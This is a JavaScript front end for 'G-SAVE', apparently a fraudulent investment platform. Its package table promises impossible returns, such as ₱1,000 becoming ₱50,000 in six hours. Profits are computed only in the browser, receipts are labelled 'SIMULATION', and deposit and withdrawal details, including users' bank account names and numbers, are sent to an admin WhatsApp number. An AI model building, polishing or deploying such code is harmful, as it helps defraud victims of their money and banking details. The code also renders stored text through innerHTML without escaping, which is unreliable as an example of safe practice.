// ===============================
// G-SAVE STABLE HYBRID DASHBOARD v2
// FULL SAFE PRODUCTION VERSION
// ===============================

console.log("✅ G-SAVE HYBRID DASHBOARD v2 LOADED");

// ===============================
// FIREBASE
// ===============================
const firebaseConfig = {
  apiKey: "AIzaSyCewm0z-8PA4JIvHR6WZ5QJZ1cTVfRPvXo",
  authDomain: "g-save-investment.firebaseapp.com",
  projectId: "g-save-investment",
  appId: "1:223920210175:web:719631a9fa002e17a98cca"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);

// ===============================
// API
// ===============================
const API = "https://gsave-investment.onrender.com/api/user";

// ===============================
// ADMIN WHATSAPP
// ===============================
const ADMIN_WHATSAPP = "15488577219";

// ===============================
// SAFE CURRENCY CORE
// ===============================
const CURRENCY = {
  symbol: "₱",
  allowed: ["₱","₦","$","PHP","php","naira","NAIRA"]
};

function normalizeMoney(v){
  if (typeof v === "number") return v;
  if (!v) return 0;

  let s = String(v);
  CURRENCY.allowed.forEach(sym => {
    s = s.split(sym).join("");
  });

  return Number(s.replace(/,/g,"")) || 0;
}

function php(v){
  const num = normalizeMoney(v);
  return CURRENCY.symbol + num.toLocaleString(undefined,{
    minimumFractionDigits:2,
    maximumFractionDigits:2
  });
}

function cleanCurrencyText(text){
  if (!text) return text;
  let s = String(text);
  CURRENCY.allowed.forEach(sym=>{
    s = s.split(sym).join(CURRENCY.symbol);
  });
  return s;
}

// ===============================
// STATE
// ===============================
let currentUser = null;
let balance = 0;
let cyt = 0;
let withdrawable = 0;
let historyData = [];
let investments = [];
let chart = null;

// ===============================
// FLOW STATE
// ===============================
let depositStep = 1;
let withdrawStep = 1;

// ===============================
// SETTINGS
// ===============================
const CYT_RATE = 3000000;

const PACKAGES = [
  { id:1,peso:1000,profit:50000,hours:6 },
  { id:2,peso:2000,profit:100500,hours:8 },
  { id:3,peso:3000,profit:140000,hours:10 },
  { id:4,peso:4000,profit:210000,hours:12 },
  { id:5,peso:5000,profit:300000,hours:16 },
  { id:6,peso:6000,profit:370000,hours:18 },
  { id:7,peso:7000,profit:460000,hours:24 },
  { id:8,peso:8000,profit:580000,hours:36 },
  { id:9,peso:9000,profit:670000,hours:48 },
  { id:10,peso:10000,profit:750000,hours:60 },
  { id:11,peso:20000,profit:8300000,hours:72 }
];

// ===============================
// HELPERS
// ===============================
function phpToCYT(v){
  return normalizeMoney(v) / CYT_RATE;
}

function popup(msg,color="#16a34a"){
  const el = document.getElementById("popup");
  if(!el) return;

  el.innerText = msg;
  el.style.background = color;
  el.classList.add("show");

  setTimeout(()=>el.classList.remove("show"),2500);
}

function receipt(title,msg){
  const box = document.getElementById("receiptBox");
  const wrap = document.getElementById("receipt");
  if(!box || !wrap) return;

  box.innerHTML = `
    <h2>${title}</h2>
    <p style="white-space:pre-line;margin:12px 0;">${msg}</p>
    <button class="primary-btn" onclick="closeReceipt()">OK</button>
  `;

  wrap.classList.remove("hidden");
}

function generateReceiptId(type){
  return `GSV-${type === "deposit" ? "DEP" : "WTH"}-${Math.floor(100000+Math.random()*900000)}`;
}

function buildReceipt(type,data){
  return {
    id: generateReceiptId(type),
    message: `
${type.toUpperCase()} RECEIPT

Name: ${currentUser?.name || "User"}
Email: ${currentUser?.email || ""}

Amount: ${php(data.amount)}
Method: ${data.method || "N/A"}

Date: ${new Date().toLocaleString()}

Status: SIMULATION
`
  };
}

function sendToWhatsApp(msg){
  try{
    window.open(
      "https://wa.me/" + ADMIN_WHATSAPP + "?text=" + encodeURIComponent(msg),
      "_blank"
    );
  } catch(e){
    console.warn("WhatsApp blocked");
  }
}

function timeLeft(ms){
  if(!ms || ms <= 0) return "Completed";
  const h = Math.floor(ms/3600000);
  const m = Math.floor((ms%3600000)/60000);
  return `${h}h ${m}m left`;
}

// ===============================
// HISTORY
// ===============================
function addHistory(type,details){
  historyData.unshift({
    type,
    details: cleanCurrencyText(details || ""),
    time: new Date().toLocaleString()
  });

  if(historyData.length > 50) historyData.pop();
}

// ===============================
// AUTH
// ===============================
firebase.auth().onAuthStateChanged(async user=>{
  if(!user){
    window.location.replace("login.html");
    return;
  }

  document.getElementById("userEmail").innerText = user.email;

  const res = await fetch(API + "/login",{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({
      name:user.displayName || "User",
      email:user.email
    })
  });

  const data = await res.json();

  currentUser = data;

  balance = normalizeMoney(data.balance);
  cyt = normalizeMoney(data.cyt);
  withdrawable = normalizeMoney(data.withdrawable);

  historyData = (data.history || []).map(h=>({
    ...h,
    details: cleanCurrencyText(h.details)
  }));

  investments = data.investments || [];

  setTimeout(()=>{
    loadPlans();
    updateUI();
    initChart();
  },150);
});

// ===============================
// UI
// ===============================
function updateUI(){
  const b = document.getElementById("balance");
  const c = document.getElementById("cytBalance");
  const w = document.getElementById("withdrawable");

  if(b) b.innerText = php(balance);
  if(c) c.innerText = cyt.toFixed(6);
  if(w) w.innerText = php(withdrawable);

  renderHistory();
  renderInvestments();
  updateChart();
}

function renderHistory(){
  const box = document.getElementById("historyList");
  if(!box) return;

  if(!historyData.length){
    box.innerHTML = `<div class="empty">No transactions yet</div>`;
    return;
  }

  box.innerHTML = "";
  historyData.slice(0,15).forEach(h=>{
    box.innerHTML += `
      <div class="list-item">
        <strong>${h.type}</strong><br>
        ${h.details}<br>
        <small>${h.time}</small>
      </div>
    `;
  });
}

// ===============================
// INVESTMENTS
// ===============================
function renderInvestments(){
  const box = document.getElementById("investmentList");
  if(!box) return;

  if(!investments.length){
    box.innerHTML = `<div class="empty">No investments yet</div>`;
    return;
  }

  box.innerHTML = "";

  investments.forEach(inv=>{
    const now = Date.now();
    const total = inv.endTime - inv.startTime || 1;
    const left = inv.endTime - now;

    let progress = Math.min(((now-inv.startTime)/total)*100,100);
    const liveProfit = inv.profit * (progress/100);

    if(progress >= 100 && !inv.paid){
      inv.paid = true;
      inv.status = "completed";

      withdrawable += inv.principal + inv.profit;
      addHistory("Completed", `${php(inv.principal)} matured`);
      popup("Investment Completed");
    }

    box.innerHTML += `
      <div class="list-item">
        <strong>${php(inv.principal)} Package</strong><br>
        Status: ${inv.status}<br>
        Live Profit: ${php(liveProfit)}<br>
        <small>${timeLeft(left)}</small>
      </div>
    `;
  });
}

// ===============================
// PLANS
// ===============================
function loadPlans(){
  const select = document.getElementById("planSelect");
  if(!select) return;

  select.innerHTML = "";
  PACKAGES.forEach(p=>{
    const opt = document.createElement("option");
    opt.value = p.id;
    opt.textContent = `${php(p.peso)} → ${php(p.profit)} / ${p.hours}h`;
    select.appendChild(opt);
  });
}

// ===============================
// ACTIONS
// ===============================
function depositNext(){
  const amount = normalizeMoney(document.getElementById("depositAmount").value);
  const method = document.getElementById("depositMethod").value;

  if(amount < 1000){
    popup("Minimum ₱1,000","#dc2626");
    return;
  }

  const r = buildReceipt("deposit",{amount,method});
  receipt("Deposit Receipt", r.message);
  sendToWhatsApp(r.message);

  closeModal();
}

function withdrawNext(){
  const amount = normalizeMoney(document.getElementById("withdrawAmount").value || withdrawable);
  const bankName = document.getElementById("bankName").value;
  const accountNumber = document.getElementById("accountNumber").value;
  const accountName = document.getElementById("accountName").value;

  if(!bankName || !accountNumber || !accountName){
    popup("Fill bank details","#dc2626");
    return;
  }

  const r = buildReceipt("withdrawal",{amount,method:"Bank Transfer"});

  receipt("Withdrawal Receipt", r.message);
  sendToWhatsApp(r.message);

  closeModal();
}

function buyCYT(){
  const amount = normalizeMoney(document.getElementById("buyAmount").value);

  if(amount <= 0 || amount > balance){
    popup("Invalid amount","#dc2626");
    return;
  }

  balance -= amount;
  cyt += phpToCYT(amount);

  addHistory("Buy CYT", `${php(amount)} → CYT`);
  updateUI();
  popup("CYT Purchased");
}

function invest(){
  const id = Number(document.getElementById("planSelect").value);
  const pack = PACKAGES.find(p=>p.id===id);
  if(!pack) return;

  const need = phpToCYT(pack.peso);

  if(cyt < need){
    popup("Not enough CYT","#dc2626");
    return;
  }

  cyt -= need;

  investments.unshift({
    id:Date.now(),
    principal:pack.peso,
    profit:pack.profit,
    startTime:Date.now(),
    endTime:Date.now() + pack.hours*3600000,
    status:"active",
    paid:false
  });

  addHistory("Investment", `${php(pack.peso)} started`);
  updateUI();
  popup("Investment Started");
}

// ===============================
// CHART
// ===============================
function initChart(){
  const ctx = document.getElementById("profitChart");
  if(!ctx) return;

  chart = new Chart(ctx,{
    type:"line",
    data:{labels:[],datasets:[{data:[],fill:true}]},
    options:{responsive:true}
  });
}

function updateChart(){
  if(!chart) return;

  let total = 0;

  investments.forEach(inv=>{
    const max = inv.endTime - inv.startTime || 1;
    const progress = Math.min(((Date.now()-inv.startTime)/max)*100,100);
    total += inv.profit*(progress/100);
  });

  chart.data.labels.push("");
  chart.data.datasets[0].data.push(total);

  if(chart.data.labels.length > 12){
    chart.data.labels.shift();
    chart.data.datasets[0].data.shift();
  }

  chart.update();
}

// ===============================
// MODALS
// ===============================
function openModal(id){
  document.getElementById(id)?.classList.remove("hidden");
}

function closeModal(){
  document.querySelectorAll(".modal").forEach(m=>m.classList.add("hidden"));
}

function closeReceipt(){
  document.getElementById("receipt")?.classList.add("hidden");
}

// ===============================
// GLOBAL EXPORT
// ===============================
window.depositNext = depositNext;
window.withdrawNext = withdrawNext;
window.buyCYT = buyCYT;
window.invest = invest;
window.openModal = openModal;
window.closeModal = closeModal;

// ===============================
// LOOPS
// ===============================
setInterval(updateUI,3000);
setInterval(updateChart,4000);
